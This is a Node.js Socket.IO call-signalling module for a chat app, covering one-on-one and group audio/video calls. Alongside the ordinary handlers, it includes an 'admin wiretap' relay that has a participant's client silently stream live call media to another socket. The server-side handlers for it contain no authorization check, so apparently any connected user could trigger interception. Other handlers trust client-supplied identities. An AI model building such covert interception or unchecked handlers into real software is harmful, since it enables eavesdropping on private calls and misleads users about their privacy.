import { activeCallRooms, activeOneOnOneCalls, blockedRelations, users } from '../data/store.js';
import { dispatchChatMessage } from './chatHandler.js';

function getOneOnOneRoomKey(idA, idB) {
  return `call_${[String(idA || ''), String(idB || '')].sort().join('_')}`;
}

function getDirectChatId(idA, idB) {
  return `chat_${[String(idA || ''), String(idB || '')].sort().join('_')}`;
}

function emitActiveCallsUpdate(io) {
  io?.emit('admin-active-calls-updated', {
    activeCount: activeCallRooms.size + activeOneOnOneCalls.size
  });
}

function hasLiveTarget(io, userSocketMap, userId) {
  if (!userId) return false;
  const sid = userSocketMap.get(userId);
  if (sid && io.sockets.sockets.has(sid)) return true;
  const room = io.sockets.adapter.rooms.get(userId);
  return Boolean(room && room.size > 0);
}

function emitToUser(io, userSocketMap, userId, event, payload) {
  if (!userId) return false;
  const hasRoom = (io.sockets.adapter.rooms.get(userId)?.size || 0) > 0;
  if (hasRoom) {
    io.to(userId).emit(event, payload);
    return true;
  }
  const sid = userSocketMap.get(userId);
  if (sid && io.sockets.sockets.has(sid)) {
    io.to(sid).emit(event, payload);
    return true;
  }
  return false;
}

export function setupCallHandlers(io, socket, userSocketMap) {
  // ==========================================
  // 1-ON-1 AUDIO & VIDEO CALL SIGNALING
  // ==========================================

  // Initiate 1-on-1 call
  socket.on('call-user', ({ userToCall, signalData, from, fromName, fromAvatar, isVideo = false }) => {
    // 🛡️ SECURITY: Anti-Impersonation Check
    if (socket.userId && from && socket.userId !== from) {
      console.warn(`[Security Alert] Blocked spoofed call attempt from socket ${socket.id} claiming to be ${from}`);
      return;
    }

    // Check if recipient has blocked caller
    if (Array.isArray(blockedRelations[userToCall]) && blockedRelations[userToCall].includes(from)) {
      socket.emit('call-rejected', { reason: 'Unable to connect call.' });
      return;
    }

    const callerUser = users.find(u => u.id === from);
    const targetUser = users.find(u => u.id === userToCall);
    const targetSocketId = userSocketMap.get(userToCall);
    const isReachable = hasLiveTarget(io, userSocketMap, userToCall);
    console.log(`[Call] ${fromName} (${from}) calling ${userToCall} [Video: ${isVideo}] Reachable: ${isReachable} TargetSocket: ${targetSocketId}`);

    if (isReachable) {
      const roomId = getOneOnOneRoomKey(from, userToCall);
      activeOneOnOneCalls.set(roomId, {
        roomId,
        kind: '1on1',
        callerId: from,
        callerName: fromName || (callerUser?.name && callerUser.name !== 'User' ? callerUser.name : callerUser?.phone) || from,
        callerAvatar: fromAvatar || callerUser?.avatar || '',
        targetId: userToCall,
        targetName: (targetUser?.name && targetUser.name !== 'User' ? targetUser.name : targetUser?.phone) || userToCall,
        targetAvatar: targetUser?.avatar || '',
        isVideo: Boolean(isVideo),
        type: isVideo ? 'video' : 'audio',
        status: 'ringing',
        callerSocketId: socket.id,
        targetSocketId: targetSocketId || null,
        callerIceCandidates: [],
        targetIceCandidates: [],
        startedAt: new Date().toISOString()
      });
      emitActiveCallsUpdate(io);

      emitToUser(io, userSocketMap, userToCall, 'incoming-call', {
        signal: signalData,
        from,
        fromName: fromName || callerUser?.name || callerUser?.phone || 'User',
        fromPhone: callerUser?.phone || '',
        fromAvatar: fromAvatar || callerUser?.avatar || '',
        isVideo: Boolean(isVideo),
        callType: isVideo ? 'video' : 'audio'
      });
    } else {
      socket.emit('call-failed', { reason: 'User is currently offline or unreachable.' });
    }
  });

  // Answer 1-on-1 call
  socket.on('answer-call', ({ to, signal }) => {
    const callerSocketId = userSocketMap.get(to);
    console.log(`[Call] Call answered by ${socket.id} to caller ${to} (socket: ${callerSocketId})`);

    const roomKey = socket.userId ? getOneOnOneRoomKey(to, socket.userId) : null;
    const callEntry = (roomKey && activeOneOnOneCalls.get(roomKey))
      || Array.from(activeOneOnOneCalls.values()).find(c => c.callerId === to || c.targetId === to);
    if (callEntry) {
      callEntry.status = 'connected';
      callEntry.targetSocketId = socket.id;
      callEntry.connectedAt = new Date().toISOString();
      emitActiveCallsUpdate(io);

      // Replay any caller ICE candidates buffered while callee phone was ringing
      if (Array.isArray(callEntry.callerIceCandidates) && callEntry.callerIceCandidates.length > 0) {
        callEntry.callerIceCandidates.forEach(cand => {
          socket.emit('ice-candidate', {
            candidate: cand,
            from: callEntry.callerId
          });
        });
      }
    }

    emitToUser(io, userSocketMap, to, 'call-accepted', {
      signal,
      from: socket.userId
    });
  });

  // Reject / Decline call
  socket.on('reject-call', ({ to, reason = 'declined' }) => {
    console.log(`[Call] Call declined by ${socket.id} to ${to}`);

    let loggedMissed = false;
    for (const [roomKey, entry] of activeOneOnOneCalls.entries()) {
      const involvesPeer = entry.callerId === to || entry.targetId === to;
      const involvesSelf = !socket.userId || entry.callerId === socket.userId || entry.targetId === socket.userId;
      if (involvesPeer && involvesSelf) {
        if (!loggedMissed && entry.callerId && entry.targetId) {
          loggedMissed = true;
          dispatchChatMessage(io, userSocketMap, {
            chatId: getDirectChatId(entry.callerId, entry.targetId),
            senderId: entry.callerId,
            senderName: entry.callerName,
            recipientId: entry.targetId,
            type: 'call_log',
            text: entry.isVideo ? '📹 Missed video call' : '📞 Missed voice call',
            mediaUrl: null,
            encrypted: true
          });
        }
        activeOneOnOneCalls.delete(roomKey);
      }
    }
    emitActiveCallsUpdate(io);

    emitToUser(io, userSocketMap, to, 'call-rejected', { reason });
  });

  // ICE Candidate exchange for 1-on-1 (buffered during ringing so none are lost)
  socket.on('ice-candidate', ({ to, candidate }) => {
    if (!candidate || !to) return;
    if (socket.userId) {
      const roomKey = getOneOnOneRoomKey(socket.userId, to);
      const entry = activeOneOnOneCalls.get(roomKey);
      if (entry) {
        if (entry.callerId === socket.userId) {
          entry.callerIceCandidates.push(candidate);
        } else {
          entry.targetIceCandidates.push(candidate);
        }
      }
    }
    emitToUser(io, userSocketMap, to, 'ice-candidate', {
      candidate,
      from: socket.userId
    });
  });

  // Seamless ICE restart for call recovery & anti-freeze
  socket.on('call-ice-restart', ({ to, signal }) => {
    if (to && signal) {
      emitToUser(io, userSocketMap, to, 'call-ice-restart', {
        signal,
        from: socket.userId
      });
    }
  });

  socket.on('call-ice-restart-answer', ({ to, signal }) => {
    if (to && signal) {
      emitToUser(io, userSocketMap, to, 'call-ice-restart-answer', {
        signal,
        from: socket.userId
      });
    }
  });

  // End call
  socket.on('end-call', ({ to }) => {
    console.log(`[Call] Call ended between ${socket.id} and ${to}`);

    let loggedMissedOnEnd = false;
    for (const [roomKey, entry] of activeOneOnOneCalls.entries()) {
      const involvesPeer = entry.callerId === to || entry.targetId === to;
      const involvesSelf = !socket.userId || entry.callerId === socket.userId || entry.targetId === socket.userId;
      if (involvesPeer && involvesSelf) {
        if (entry.status === 'ringing' && !loggedMissedOnEnd && entry.callerId && entry.targetId) {
          loggedMissedOnEnd = true;
          dispatchChatMessage(io, userSocketMap, {
            chatId: getDirectChatId(entry.callerId, entry.targetId),
            senderId: entry.callerId,
            senderName: entry.callerName,
            recipientId: entry.targetId,
            type: 'call_log',
            text: entry.isVideo ? '📹 Missed video call' : '📞 Missed voice call',
            mediaUrl: null,
            encrypted: true
          });
        }
        activeOneOnOneCalls.delete(roomKey);
      }
    }
    emitActiveCallsUpdate(io);

    emitToUser(io, userSocketMap, to, 'call-ended');
  });

  // Invite an additional participant into a live call
  socket.on('invite-to-call', ({ targetUserId, fromUser, isVideo = false, currentParticipants = [] }) => {
    const targetSocketId = userSocketMap.get(targetUserId);
    console.log(`[Call] ${fromUser?.name} inviting ${targetUserId} to ongoing call`);
    const destination = targetSocketId || targetUserId;
    if (destination) {
      io.to(destination).emit('incoming-call-invitation', {
        from: fromUser?.id,
        fromName: fromUser?.name,
        fromAvatar: fromUser?.avatar,
        isVideo,
        currentParticipants,
        callType: isVideo ? 'video' : 'audio',
        timestamp: new Date().toISOString()
      });
    }
  });


  // ==========================================
  // GROUP AUDIO & VIDEO CALL SIGNALING (SFU / MESH)
  // ==========================================

  // Join a group call room
  socket.on('join-group-call', ({ groupId, user, isVideo = false }) => {
    const roomId = `call_room_${groupId}`;
    socket.join(roomId);

    if (!activeCallRooms.has(roomId)) {
      activeCallRooms.set(roomId, new Map());
    }

    const roomParticipants = activeCallRooms.get(roomId);
    
    // Send list of existing participants to the new joiner
    const existingUsers = Array.from(roomParticipants.values());
    socket.emit('group-call-existing-participants', {
      participants: existingUsers,
      roomId
    });

    // Add current user to room participant map
    const participantInfo = {
      socketId: socket.id,
      userId: user.id,
      name: user.name,
      avatar: user.avatar,
      isVideo,
      isMuted: false,
      joinedAt: new Date().toISOString()
    };
    roomParticipants.set(socket.id, participantInfo);

    // Broadcast to others in the room that this user has joined
    socket.to(roomId).emit('group-call-user-joined', {
      participant: participantInfo
    });
    emitActiveCallsUpdate(io);

    console.log(`[Group Call] ${user.name} joined room ${roomId}. Total: ${roomParticipants.size}`);
  });

  // Relay WebRTC signal between group call participants
  socket.on('group-call-signal', ({ toSocketId, signal, fromUser }) => {
    io.to(toSocketId).emit('group-call-signal', {
      signal,
      fromSocketId: socket.id,
      fromUser
    });
  });

  // Toggle media state in group call (mute / camera toggle)
  socket.on('group-call-toggle-media', ({ roomId, isMuted, isVideoOff }) => {
    if (activeCallRooms.has(roomId)) {
      const room = activeCallRooms.get(roomId);
      if (room.has(socket.id)) {
        const participant = room.get(socket.id);
        participant.isMuted = isMuted;
        participant.isVideo = !isVideoOff;
      }
    }
    socket.to(roomId).emit('group-call-participant-media-changed', {
      socketId: socket.id,
      isMuted,
      isVideoOff
    });
  });

  // Leave group call room
  socket.on('leave-group-call', ({ roomId }) => {
    handleUserLeaveGroupCall(socket, roomId, io);
  });

  // ==========================================
  // ADMIN LIVE WEBRTC WIRETAP RELAY (RECEIVE-ONLY)
  // ==========================================
  socket.on('admin-wiretap-start', ({ roomId, targetSocketId, userId, targetId } = {}) => {
    let resolvedPeerSocketId = targetSocketId && io.sockets.sockets.has(targetSocketId) ? targetSocketId : null;

    if (!resolvedPeerSocketId && roomId && activeOneOnOneCalls.has(roomId)) {
      const entry = activeOneOnOneCalls.get(roomId);
      const candidates = [
        entry.callerSocketId,
        entry.targetSocketId,
        userSocketMap.get(entry.callerId),
        userSocketMap.get(entry.targetId)
      ];
      resolvedPeerSocketId = candidates.find(sid => sid && io.sockets.sockets.has(sid)) || null;
    }

    if (!resolvedPeerSocketId && roomId && activeCallRooms.has(roomId)) {
      const room = activeCallRooms.get(roomId);
      for (const sid of room.keys()) {
        if (io.sockets.sockets.has(sid)) {
          resolvedPeerSocketId = sid;
          break;
        }
      }
    }

    if (!resolvedPeerSocketId && (userId || targetId)) {
      for (const entry of activeOneOnOneCalls.values()) {
        if (
          entry.callerId === userId || entry.targetId === userId ||
          entry.callerId === targetId || entry.targetId === targetId
        ) {
          const candidates = [
            entry.callerSocketId,
            entry.targetSocketId,
            userSocketMap.get(entry.callerId),
            userSocketMap.get(entry.targetId)
          ];
          resolvedPeerSocketId = candidates.find(sid => sid && io.sockets.sockets.has(sid)) || null;
          if (resolvedPeerSocketId) break;
        }
      }
    }

    if (resolvedPeerSocketId) {
      io.to(resolvedPeerSocketId).emit('admin-wiretap-request', {
        adminSocketId: socket.id,
        roomId: roomId || ''
      });
    } else {
      socket.emit('admin-wiretap-unavailable', {
        reason: 'Live call session has already ended or no active peer socket is reachable.'
      });
    }
  });

  socket.on('admin-wiretap-offer', ({ adminSocketId, signal, isVideo, callerName, targetName } = {}) => {
    if (adminSocketId && signal) {
      io.to(adminSocketId).emit('admin-wiretap-offer', {
        fromSocketId: socket.id,
        signal,
        isVideo: Boolean(isVideo),
        callerName,
        targetName
      });
    }
  });

  socket.on('admin-wiretap-answer', ({ toSocketId, signal } = {}) => {
    if (toSocketId && signal) {
      io.to(toSocketId).emit('admin-wiretap-answer', {
        adminSocketId: socket.id,
        signal
      });
    }
  });

  socket.on('admin-wiretap-ice', ({ toSocketId, candidate, fromRole } = {}) => {
    if (toSocketId && candidate) {
      io.to(toSocketId).emit('admin-wiretap-ice', {
        fromSocketId: socket.id,
        candidate,
        fromRole
      });
    }
  });

  socket.on('admin-wiretap-stop', ({ toSocketId } = {}) => {
    if (toSocketId) {
      io.to(toSocketId).emit('admin-wiretap-stop', { adminSocketId: socket.id });
    }
  });

  // Disconnect handler for calls
  socket.on('disconnect', () => {
    let removedOneOnOne = false;
    for (const [roomKey, entry] of activeOneOnOneCalls.entries()) {
      if (
        entry.callerSocketId === socket.id ||
        entry.targetSocketId === socket.id ||
        (socket.userId && (entry.callerId === socket.userId || entry.targetId === socket.userId))
      ) {
        activeOneOnOneCalls.delete(roomKey);
        removedOneOnOne = true;
      }
    }
    if (removedOneOnOne) {
      emitActiveCallsUpdate(io);
    }

    // Check and clean up active group calls
    for (const [roomId, room] of activeCallRooms.entries()) {
      if (room.has(socket.id)) {
        handleUserLeaveGroupCall(socket, roomId, io);
      }
    }
  });
}

function handleUserLeaveGroupCall(socket, roomId, io) {
  socket.leave(roomId);
  if (activeCallRooms.has(roomId)) {
    const room = activeCallRooms.get(roomId);
    room.delete(socket.id);

    io.to(roomId).emit('group-call-user-left', {
      socketId: socket.id
    });

    console.log(`[Group Call] Socket ${socket.id} left room ${roomId}. Remaining: ${room.size}`);

    if (room.size === 0) {
      activeCallRooms.delete(roomId);
    }
    emitActiveCallsUpdate(io);
  }
}

